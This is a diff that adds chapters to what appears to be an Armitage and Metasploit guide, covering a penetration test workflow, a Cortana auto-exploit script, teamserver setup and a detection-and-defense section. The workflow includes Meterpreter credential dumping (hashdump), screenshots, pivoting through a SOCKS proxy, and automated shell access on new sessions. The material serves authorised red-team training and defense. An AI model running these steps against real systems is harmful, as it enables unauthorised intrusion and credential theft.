@@ -346,6 +346,147 @@ tail -f /root/.msf4/logs/msfconsole.log
 
 ---
 
+## Chapter 9: Real-World Scenarios
+
+### Network Penetration Test Workflow
+
+```bash
+# 1. Start Armitage and connect to teamserver
+armitage
+# Enter teamserver IP, port 55553, and password
+
+# 2. Discover hosts
+# Hosts > Nmap Scan > Intense Scan (TCP)
+# Targets appear in the Targets panel
+
+# 3. Analyze and attack
+# Right-click hosts to see recommended exploits
+# Green bolt = likely success, Orange = risky, Red = likely fail
+
+# 4. Launch exploit
+# Double-click host > Select exploit > Configure options > Launch
+
+# 5. Post-exploitation
+# Once Meterpreter session opens:
+sysinfo
+getuid
+hashdump
+screenshot
+
+# 6. Pivoting
+run autoroute -s 10.0.0.0/24
+use auxiliary/server/socks_proxy
+set SRVPORT 1080
+run
+
+# 7. Scan internal network
+db_nmap -sT 10.0.0.0/24
+```
+
+### Cortana Automation Script
+
+```bash
+# Auto-exploit script
+on session {
+    println("Session opened from " . $1);
+    session_system($1);
+    session_shell($1);
+    exec("use post/windows/gather/enum_applications");
+    exec("set SESSION " . $1);
+    exec("run");
+}
+```
+
+### Collaborative Red Team Exercise
+
+```bash
+# Team Lead: Start teamserver
+teamserver 192.168.1.100 s3cr3t
+
+# Operators connect to same teamserver
+# All share sessions, events, and data
+# Use Events panel to coordinate attacks
+```
+
+---
+
+## Chapter 10: Cortana Scripting Reference
+
+### Event Hooks
+
+```bash
+# On new session
+on session {
+    println("New session: " . $1);
+}
+
+# On host discovery
+on host {
+    println("New host: " . host_os($1));
+}
+
+# On console output
+on console_output {
+    println("Console: " . $1);
+}
+```
+
+### Available Functions
+
+| Function | Description |
+|---|---|
+| `host_os($id)` | Get host OS |
+| `host_ip($id)` | Get host IP |
+| `session_system($id)` | Get session system info |
+| `session_shell($id)` | Drop to shell |
+| `exec($cmd)` | Execute console command |
+| `println($msg)` | Print to Armitage console |
+
+---
+
+## Chapter 11: Detection and Defense
+
+### Network Signatures
+
+- Multiple exploit attempts from single source
+- Meterpreter sessions (encrypted TCP on port 4444 or other)
+- Msfrpcd traffic on port 55553
+- Unusual Nmap scan patterns
+
+### Host-Based Detection
+
+```bash
+# Monitor for Metasploit payloads
+# Windows Event IDs:
+# - Event ID 4688: Process Creation
+# - Event ID 1102: Audit Log Cleared
+
+# Linux detection
+grep -i "meterpreter\|metasploit" /var/log/syslog
+journalctl | grep -i "suspicious.*process"
+```
+
+### Defense Recommendations
+
+1. Deploy endpoint detection and response (EDR)
+2. Monitor for exploit payloads
+3. Implement exploit protection rules
+4. Use application whitelisting
+5. Monitor for credential dumping tools
+
+### Exploit Protection
+
+```bash
+# Enable Windows Exploit Protection
+# PowerShell command
+Set-ProcessMitigation -System -Enable DEP,SEHOP,ForceRelocateImages
+
+# Configure ASLR
+Set-ProcessMitigation -System -Enable BottomUp,HighEntropy
+```
+
+---
+
 ## Resources
 
 - **GitHub Repository:** https://github.com/rsmudge/armitage
@@ -353,4 +494,7 @@ tail -f /root/.msf4/logs/msfconsole.log
 - **Armitage Website:** http://www.fastandeasyhacking.com
 - **Metasploit Documentation:** https://docs.metasploit.com/
 - **MITRE ATT&CK - Command and Control:** https://attack.mitre.org/tactics/TA0011/
+- **MITRE ATT&CK - Exploitation for Client Execution:** https://attack.mitre.org/techniques/T1203/
+- **MITRE ATT&CK - Ingress Tool Transfer:** https://attack.mitre.org/techniques/T1105/
+- **MITRE ATT&CK - Remote Services:** https://attack.mitre.org/techniques/T1021/
 - **Related Tools:** Metasploit Framework, msfconsole, msfvenom
